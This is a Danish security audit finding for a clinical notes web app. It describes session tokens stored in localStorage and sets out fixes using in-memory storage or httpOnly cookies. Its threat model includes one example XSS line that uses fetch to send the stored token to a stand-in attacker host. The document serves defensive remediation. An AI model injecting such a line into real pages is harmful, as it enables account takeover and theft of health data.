# 03 - Session-tokens i localStorage

## Sværhedsgrad
Høj

## Problem (normalt sprog)
Når du logger ind gemmes din login-nøgle (access token) i browserens localStorage. Hvis en angriber nogensinde får mulighed for at køre JavaScript på siden (via XSS — f.eks. et ondsindet link), kan de øjeblikkeligt stjæle din nøgle og overtage din konto. For en medicinsk app der håndterer kliniske noter er dette særligt alvorligt — og GDPR kræver at man minimerer risikoen for uautoriseret adgang til helbredsdata.

## Analyse af nuværende kode

**`public/index.html` — login (linje ~2649):**
```javascript
localStorage.setItem('clinlog_session', JSON.stringify({
  access_token:  signInData.session.access_token,
  refresh_token: signInData.session.refresh_token,
  expires_at:    signInData.session.expires_at,
  user:          signInData.session.user,
}));
```

**`public/index.html` — session-restore (linje ~2550):**
```javascript
const stored = localStorage.getItem('clinlog_session');
const { access_token, refresh_token } = JSON.parse(stored);
await supabase.auth.setSession({ access_token, refresh_token });
```

**`public/index.html` — Supabase-klient (linje ~1671):**
```javascript
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: {
    storage: window.localStorage,  // ← problemet
    ...
  }
});
```

Tokens er fuldt læsbare fra JavaScript: `localStorage.getItem('clinlog_session')` returnerer access_token i klartekst.

## Trusselsmodel
**Hvem:** Enhver der kan køre JavaScript i offerets browser — via XSS, browser-extensions, eller ondsindet link.
**Hvad de kan opnå:** Fuldstændig kontoovertagelse — læse alle noter, slette noter, bruge Claude-proxyen.

Angrebsscenarie:
1. Angriber finder en XSS-sårbarhed (f.eks. i en tredjeparts script, browser extension)
2. Injicerer: `fetch('https://angriber.com/?t=' + localStorage.getItem('clinlog_session'))`
3. Angriber modtager access_token + refresh_token
4. Bruger token til at tilgå Supabase-API direkte og læse alle offerets noter

## Bedste løsning

**Mulighed A (anbefalet — lav kompleksitet):** Brug Supabase's `memory` storage i stedet for localStorage.
Tokens lever kun i RAM — forsvinder ved sidegenindlæsning. Brugeren skal logge ind igen ved hvert besøg. Enkel fix, ingen serverændringer.

**Mulighed B (høj kompleksitet — korrekt for medicinsk app):** httpOnly cookies via Netlify Functions.
Tokens gemmes i httpOnly cookies som JavaScript slet ikke kan læse. Kræver at al Supabase-kommunikation går via Netlify Functions. Større omskrivning.

**Anbefaling:** Start med Mulighed A nu — det fjerner den direkte localStorage-eksponering. Mulighed B er den rigtige løsning langsigtet men kræver en større arkitekturændring.

## Konkret implementering

### Mulighed A — Memory storage (implementer nu, ~30 min)

**`public/index.html` — skift storage:**
```javascript
// FØR:
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: {
    storage: window.localStorage,
    autoRefreshToken: true,
    persistSession: true,
    detectSessionInUrl: false,
  }
});

// EFTER:
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: {
    storage: null,           // brug in-memory (default når null)
    autoRefreshToken: true,
    persistSession: false,   // ingen persistence på tværs af sideindlæsninger
    detectSessionInUrl: false,
  }
});
```

**Fjern manuel localStorage-håndtering:**
```javascript
// FJERN disse linjer:
localStorage.setItem('clinlog_session', JSON.stringify({...}));
localStorage.getItem('clinlog_session');
localStorage.removeItem('clinlog_session');

// FJERN restoreSession()-funktionen helt

// BEHOLD onAuthStateChange — den håndterer alt:
supabase.auth.onAuthStateChange((_event, session) => {
  if (session) { currentSession = session; showPortal(session.user); }
  else { currentSession = null; showLanding(); }
});
```

**Breaking change:** Brugere skal logge ind igen ved hvert besøg. Tilføj en venlig besked:
```javascript
// I showLanding()-funktionen, tilføj:
// (vises kun første gang efter skiftet)
if (sessionStorage.getItem('was_logged_in')) {
  sessionStorage.removeItem('was_logged_in');
  // vis evt. en lille info-besked: "Af sikkerhedshensyn skal du logge ind igen"
}
```

### Mulighed B — httpOnly cookies (fremtidig arkitektur)
Kræver:
1. Ny Netlify Function: `netlify/functions/auth-login.js` der sætter httpOnly cookie
2. Ny Netlify Function: `netlify/functions/auth-logout.js` der sletter cookie
3. Alle Supabase-kald går via en proxy-funktion der læser cookie server-side
4. Brug `@supabase/ssr` pakken

Dette er en komplet omskrivning og anbefales som næste store version.

## Test / verifikation
```javascript
// Efter Mulighed A — kør i browser-konsollen mens logget ind:
localStorage.getItem('clinlog_session');
// Bør returnere: null

// Tjek at session stadig virker:
// Naviger rundt i portalen — alt bør fungere normalt
// Genindlæs siden — bør redirecte til login (ingen persistent session)
```

## Afhængigheder / rækkefølge
- Ingen afhængigheder af andre fixes
- **Breaking change:** Alle eksisterende brugeres sessions ophæves — de skal logge ind igen
- Gennemfør denne rettelse i et roligt tidspunkt, meddel evt. brugere på forhånd

## Estimeret tid
Mulighed A: 30 minutter
Mulighed B: 2-3 dage (større omskrivning)
